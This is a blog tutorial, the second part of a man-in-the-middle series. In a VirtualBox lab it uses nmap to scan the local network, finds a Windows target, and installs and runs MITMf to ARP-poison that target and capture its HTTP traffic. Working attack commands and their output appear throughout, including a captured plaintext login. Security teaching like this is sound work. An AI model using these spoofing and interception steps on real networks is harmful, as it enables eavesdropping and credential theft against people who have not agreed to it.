+++
title = "MITM Part 2 - Scan & Attack"
date = "2017-02-17"
tags = ["mitm", "linux", "networks", "hacking"]
categories = ["security"]
banner = "img/posts/mitm2/banner.jpg"
+++

_This is the second part in our series of security/penetration testing/ethical hacking articles, continuing where we left off in [part 1](/blog/2017/02/10/mitm-part-1/). This will be a slightly longer post, but stick with it and you'll see just how easy it is._

## Introduction

In this part of the series, we're going to use our Kali based attacker's machine to scan the local network and find our Windows target. We'll then carry out an ARP Poisoning based MITM attack against it as we explained in [part 1](/blog/2017/02/10/mitm-part-1/). Once we have obtained a MITM position, we can then passively analyse the targets HTTP traffic to see what they're up to.

We'll be taking this step by step and explaining everything along the way, so let's dive in and get comfortable in the terminal, if you're not already...

## Discovery

To be able to carry out our MITM attack, we need to know the IP address of our target and the default gateway (usually the router). In our test environment, apart from ourselves, we only have one other connected virtual machine (the Windows target), so we could just have a look in VirtualBox or on the target machine to find out what IP address it has. On a "real" network though, an attacker wouldn't be able to do this.

So the first thing we need to do as an attacker is to start exploring the network we're connected to. We need to find out what else is on the network so we can identify possible targets of interest.

#### Our machine

Before scanning the network for potential targets though, we need to start by finding our own IP address and the address of the default gateway.

On the Kali machine, open a new Terminal window (you can find Terminal in the dock on the left-hand side) and enter - `ifconfig`. You should see something similar to the following:
```html
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::a00:27ff:fe27:6d4  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:27:06:d4  txqueuelen 1000  (Ethernet)
        RX packets 6  bytes 1660 (1.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 27  bytes 2771 (2.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 18  bytes 1058 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1058 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We're only interested in the `eth0` interface. Its the first, and only, ethernet interface (additional ethernet interfaces would be named `eth1`, `eth2`, etc.) and is our network interface card (NIC), which on a real machine would have a standard Cat 5 ethernet cable plugged into it. In this case it's a virtual interface that's connected to our virtual `NAT Network` in VirtualBox.

Note: If we were connected to a network via WIFI we would be interested in the `wlan0` interface, which isn't shown here because we don't have a wireless interface installed on this VM.

You can see that the IP address we've been assigned is `10.0.2.15` (`inet`).

Now we need to find the IP address for the default gateway - it's usually on `X.X.X.1`, so looking at the IP address we've been assigned you would expect to find it on `10.0.2.1`, but let's double check by entering `ip route` into the terminal:

```html
root@kali:~# ip route
default via 10.0.2.1 dev eth0 proto static metric 100
10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100
```

Sure enough, our default gateway is on `10.0.2.1`. We'll need to make a note of these IP addresses so we can refer to them later.

#### Scanning the network

Now we know we're on a network with a `10.0.2.X` address range, we can scan the rest of the network to see what's out there. To do this we're going to use a tool called [Nmap](https://nmap.org/) - the "Network Mapper":

> Nmap ("Network Mapper") is a free and open source utility for network discovery and security auditing... Nmap uses raw IP packets in novel ways to determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics.

We'll use Nmap to quickly scan our entire `10.0.2.X` network, and once we have identified a potential target, we'll then see what a more targeted scan against it looks like. If you enter `nmap --help` into your terminal you will see all of the different commands and options you can use with Nmap.

Nmap is capable of lots of different scan types, but some of them can take quite a while depending on how intensive they are. One of the simplest and quickest scan types is called a `Ping Scan`, and is used with the `-sn` option (found under the `HOST DISCOVERY` section of the help output) along with an IP address (or range of IP addresses).

If you enter `nmap -sn 10.0.2.1/24` into the terminal you should see something similar to:
```html
root@kali:~# nmap -sn 10.0.2.1/24

Starting Nmap 7.40 ( https://nmap.org ) at 2017-02-15 16:00 EST
Nmap scan report for 10.0.2.1
Host is up (0.00039s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.2
Host is up (0.00037s latency).
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
Nmap scan report for 10.0.2.3
Host is up (0.00093s latency).
MAC Address: 08:00:27:3B:74:CF (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.5
Host is up (0.00086s latency).
MAC Address: 08:00:27:CC:BE:AF (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.0.2.15
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.12 seconds
```
The range `10.0.2.1/24` we've used here is every IP address from `10.0.2.0` to `10.0.2.255`, and it should find every host/device on our local network. By default Nmap will only log hosts that are "up" and responding, but you can also see the whole IP address range scan by using the verbose `-v` output option: `nmap -sn 10.0.2.1/24 -v`.

We can see that Nmap found 5 hosts/devices on our test network - including the default gateway and our own machine that we already know about - and has logged the IP/MAC addresses along with the vendor name for the MAC address, which we'll come to in a minute.

Unfortunately, in our virtual test network it's a little bit difficult for us to quickly tell what these hosts are. This is because the devices we're using are virtual, using virtual network interfaces that identify as `QEMU virtual NIC` etc. On a real network though, life is a bit easier for us. Here's a scan of my home network:
```html
root@kali:~# nmap -sn 192.168.1.1/24

Starting Nmap 7.40 ( https://nmap.org ) at 2017-02-15 16:15 EST
Nmap scan report for 192.168.1.1
Host is up (0.0025s latency).
MAC Address: 00:00:00:00:28:91 (Asustek Computer)
Nmap scan report for 192.168.1.2
Host is up (0.28s latency).
MAC Address: 00:00:00:00:D5:EF (Apple)
Nmap scan report for 192.168.1.39
Host is up (0.045s latency).
MAC Address: 00:00:00:00:85:5B (Amazon Technologies)
Nmap scan report for 192.168.1.61
Host is up (0.0035s latency).
MAC Address: 00:00:00:00:59:AE (Sonos)
Nmap scan report for 192.168.1.164
Host is up (0.24s latency).
MAC Address: 00:00:00:00:C1:5B (Apple)
Nmap scan report for 192.168.1.235
Host is up (0.00015s latency).
MAC Address: 00:00:00:00:16:34 (Apple)
Nmap scan report for 192.168.1.253
Host is up (0.0017s latency).
MAC Address: 00:00:00:00:32:2A (Private)
Nmap scan report for 192.168.1.109
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.62 seconds
```
You can see the IP address range scanned is `192.168.1.X`, which is fairly typical for a home network. I have obscured the first part of the MAC addresses found in the scan, but we have some pretty clear results:

* `192.168.1.1` is an ASUS wireless router (and is our default gateway).
* `192.168.1.2`, `164`, `235` are Apple devices.
* `192.168.1.39` is an Amazon FireTV.
* `192.168.1.61` is a Sonos music hub.
* `192.168.1.253` is listed as "Private".

So how is Nmap identifying these vendor names based on a quick ping scan? Remember in [part 1](/blog/2017/02/10/mitm-part-1/) where we mentioned that MAC addresses are unique and assigned when the device is manufactured? To ensure that those MAC addresses really are unique, and one vendor doesn't assign a MAC address to a product that is already in use by another vendor, vendors are given a specific range of MAC addresses that that they're allowed to assign to their products by the IEEE (Institute of Electrical and Electronics Engineers)... so Nmap can easily tell which vendor range a MAC address belongs to.

You can also have "Private" assignments from the IEEE for vendors that have paid an additional privacy registration [fee](https://standards.ieee.org/develop/regauth/oui/index.html).

Given results like this, we can easily target an interesting looking specific IP address for further scrutiny. Let's pick the Sonos device, `192.168.1.61` and use Nmap to carry out a more intensive scan, by entering `nmap ﻿-T4 -A 192.168.1.61` into the terminal:
```html
root@kali:~# nmap -T4 -A 192.168.1.61

Starting Nmap 7.40 ( https://nmap.org ) at 2017-02-15 16:39 EST
Nmap scan report for 192.168.1.61
Host is up (0.0016s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE  VERSION
1443/tcp open  ssl/upnp Sonos upnpd 34.7-35162c (UPnP 1.0; model ZP90)
MAC Address: 00:00:00:00:59:AE (Sonos)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.18 - 2.4.35 (likely embedded)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -17171d12h13m05s, deviation: 0s, median: -17171d12h13m05s

TRACEROUTE
HOP RTT     ADDRESS
1   1.62 ms 192.168.1.61

```
For a more intensive scan like this it's usually easier to target a single IP address, rather than a large range, as they can take quite a while to complete. We can see that this scan found an open TCP port `1443` with a [UPnP](https://en.wikipedia.org/wiki/Universal_Plug_and_Play) service running on it, with the current version information. We've also discovered some operating system details `Linux 2.4.18 - 2.4.35 (likely embedded)`.

None of this specific information is really necessary for a MITM attack. We only need the IP address of potential target and the default gateway, but it gives us a clearer picture whats on the network. Also, in the future if we start to cover exploiting machines directly, and not just MITM attacking their internet traffic, the more information we can gather at this stage the better as it will help us find specific exploits in these software versions.

Anyway, moving back to our virtual test network...

By process of elimination we can tell that our Windows target machine is:
```html
Nmap scan report for 10.0.2.5
Host is up (0.00086s latency).
MAC Address: 08:00:27:CC:BE:AF (Oracle VirtualBox virtual NIC)
```
We know that the default gateway is on `10.0.2.1`, our own IP address is `10.0.2.15` and the other 2 IP addresses `10.0.2.2` & `10.0.2.3` are for DHCP/DNS (not a typical configuration)... so that leaves us with `10.0.2.5`. As we saw with the scan of my home network earlier, it's usually a lot easier to identify devices on a real network rather than a virtual one.

Now that we know our Windows target IP address is `10.0.2.5` and our default gateway IP address is `10.0.2.1`, we have everything we need to launch our attack.

## The MITM attack

We're going to use [MITMf](https://github.com/byt3bl33d3r/MITMf) (Man In The Middle framework) to execute the MITM attack.

> MITMf aims to provide a one-stop-shop for Man In The Middle and network attacks while updating and improving existing attacks and techniques. Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost completely re-written from scratch to provide a modular and easily extendible framework that anyone can use to implement their own MITM attack.

It's Python based and unfortunately does not come pre-installed with Kali, so we'll have to jump through a few hoops to get it ready. It will be worth it though, once we have it installed it's very easy to use. We need to enter the following commands into the terminal to successfully install it along with the other programs it needs:

* `apt-get update` - will download the latest package lists from the repositories.
* `apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file` - will download the required system dependencies. Enter `Y` to continue when prompted.
* `git clone https://github.com/byt3bl33d3r/MITMf` - will download the MITMf repository. It will be downloaded to a folder called MITMf.
* `cd MITMf` - to change into the MITMf directory we just downloaded.
* `git submodule init && git submodule update --recursive` - will download the additional MITMf submodules.
* `pip install -r requirements.txt` - will download the Python dependencies for MITMf.

We should now be set. You can see MITMf's usage instructions by entering `python mitmf.py --help`.

MITMf only needs to know our target and default gateway IP addresses to initiate the MITM attack. It takes care of everything else for us, using the ARP Poisoning technique discussed in [part 1](/blog/2017/02/10/mitm-part-1/) to change our target's ARP cache entry for the default gateway, re-routing its internet bound traffic to our own MAC address instead.

It also takes care of the other side of that equation too, so the responses from the real gateway back to the target are handled - providing uninterrupted connectivity so the target is completely unaware the attack is taking place. Once we have successfully become the MITM, we'll then be able to analyse the traffic as it flows through our network interface.

But before we start, let's jump over to our target Windows machine and take a look at the current ARP cache. If you open up the command prompt (`Start Menu` > `Windows System` > `Command Prompt`) and enter `ARP -a` you should see something similar to:
```html
C:\Users\IEUser>ARP -a

Interface: 10.0.2.5 --- 0x9
  Internet Address      Physical Address      Type
  10.0.2.1              52-54-00-12-35-00     dynamic
  10.0.2.255            ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.252           01-00-5e-00-00-fc     static
  224.0.0.253           01-00-5e-00-00-fd     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```
You can see the current entry for our default gateway `10.0.2.1` with the MAC address: `52-54-00-12-35-00`.

Back on our Kali machine, let's start the MITM attack by entering `python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i eth0 --hsts` into the terminal. If it's successful you should see:
```html
root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i eth0 --hsts

 __  __   ___   .--.          __  __   ___
|  |/  `.'   `. |__|         |  |/  `.'   `.      _.._
|   .-.  .-.   '.--.     .|  |   .-.  .-.   '   .' .._|
|  |  |  |  |  ||  |   .' |_ |  |  |  |  |  |   | '
|  |  |  |  |  ||  | .'     ||  |  |  |  |  | __| |__
|  |  |  |  |  ||  |'--.  .-'|  |  |  |  |  ||__   __|
|  |  |  |  |  ||  |   |  |  |  |  |  |  |  |   | |
|__|  |__|  |__||__|   |  |  |__|  |__|  |__|   | |
                       |  '.'                   | |
                       |   /                    | |
                       `'-'                     |_|

[*] MITMf v0.9.8 - 'The Dark Side'
|
|_ Net-Creds v1.0 online
|_ Spoof v0.6
|  |_ ARP spoofing enabled
|_ Sergio-Proxy v0.2.1 online
|_ SSLstrip v0.9 by Moxie Marlinspike online
|
|_ MITMf-API online
 * Running on http://127.0.0.1:9999/ (Press CTRL+C to quit)
|_ HTTP server online
|_ DNSChef v0.4 online
|_ SMB server online


```

Congratulations! You've just MITM'd your first target. You can verify the hack by jumping back on to the Windows machine and re-running the `ARP -a` command we ran before. You should see that the MAC address for the default gateway (`10.0.2.1`) has changed from `52-54-00-12-35-00` to our attackers MAC address `08-00-27-27-06-d4`!

You might have also noticed that there were no warnings that this happened on our target Windows machine - no flashing lights, sirens or any indication at all within the operating system.

## Initial analysis

On the Windows machine let's open the Edge browser (there's a shortcut on the bottom menu bar), then navigate to `http://www.bing.com` using the address bar, search for `avsforum` and select the top result. If you check back in the terminal window on the Kali machine, you will see that MITMf is logging out the HTTP traffic as it passes through:
```html
2017-02-15 19:19:36 10.0.2.5 [type:Edge-14 os:Windows 10] www.bing.com
2017-02-15 19:19:37 10.0.2.5 [type:Edge-14 os:Windows 10] www.bing.com
2017-02-15 19:19:37 10.0.2.5 [type:Edge-14 os:Windows 10] www.bing.com
2017-02-15 19:19:37 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] native.sharethrough.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] ad.crwdcntrl.net
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] tags.crwdcntrl.net
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] partner.googleadservices.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
2017-02-15 19:19:43 10.0.2.5 [type:Edge-14 os:Windows 10] www.avsforum.com
...etc.
```
You can see all the HTTP requests our target machine is making as we browse around using Edge.

Back in the browser, if we click on the `Forums` link on the avsforum.com homepage, then try to log in with a made up username and password, you will see that MITMf logs out the `POST` request:
```html
2017-02-15 19:25:48 10.0.2.5 [type:Edge-14 os:Windows 10] POST Data (www.avsforum.com):
vb_login_username=testloop&vb_login_password=password123&cookieuser=1&s=&securitytoken=guest&do=login&vb_login_md5password=&vb_login_md5password_utf=
```
You can see the `vb_login_username` and `vb_login_password` fields sent in the clear, with the test username and password that I used to try and log in with.

Hopefully, the ease with which we just carried out this MITM attack should be starting to sink in. As we discussed in [part 1](/blog/2017/02/10/mitm-part-1/), never trust a network that isn't yours... all it takes is a quick scan with `nmap` and a single `mitmf.py` command for an attacker to successfully intercept your HTTP traffic. We might as well have written our fictitious forum username/password on a big red bus and got Boris Johnson to drive it across the country.

It's not just HTTP traffic from a web browser either, it's _everything_ that is sent over HTTP. What about all those apps on your smart phone? Most of them send and receive data to various [web services](https://en.wikipedia.org/wiki/Web_service), do you know how many of them are using HTTP and not HTTPS? Apple previously announced that they would be enforcing the use of HTTPS for iOS apps by the end of 2016, rejecting apps from the App Store that failed to do so. However, this deadline has recently been extended [indefinitely](https://developer.apple.com/news/?id=12212016b)...

## What's the big deal?

This is a question that comes up every so often. _"Is it such a big deal that someone has hacked my forum/etc account? Facebook, Gmail, Twitter and everything else I care the most about all use HTTPS, so apart from it being an inconvenience it's not the end of the world."_

Not everyone uses a password manager to create strong unique passwords for all of their frequently visited sites. In fact, hardly anyone does, with most people re-using the same one everywhere. The first thing a hacker will do is to try those login details everywhere else. They will also use these compromised sites to learn valuable information about you, information that can be used against you in social engineering attacks that you will have a much higher chance of falling for.

But worse, as we'll see in part 3 of this series, any traffic that is not sent over HTTPS can be tampered with by a MITM, creating a much more dangerous environment with an attacker potentially tricking you into revealing even more valuable information.

## Coming up next

In part 3 of this series we'll level up our analysis game using [Wireshark](https://www.wireshark.org/), then start to actively interfere with our targets traffic rather than just silently inspecting it. We'll learn how to inject javascript into responses and use further browser based exploits - like triggering fake login dialog pop-ups, plugin download notifications and much more.

...

If you'd like to use Kali outside of our virtual test network (like the example nmap scan on a real network earlier), you can change your Kali VM network settings from `NAT Network` to `Bridged Adapter` (usually requires a reboot). Your Kali machine will be then assigned an IP address on the same local network that your "host" (real machine with VirtualBox) is on.


_This should go without saying, but... if you're using these tools beyond our virtual test network, you need to own that network and the devices connected to it, or have express permission from the owners involved to carry out this testing. If you do not, then under no circumstances should you be doing it. Depending on where you live, you could be committing several offences and can be criminally prosecuted._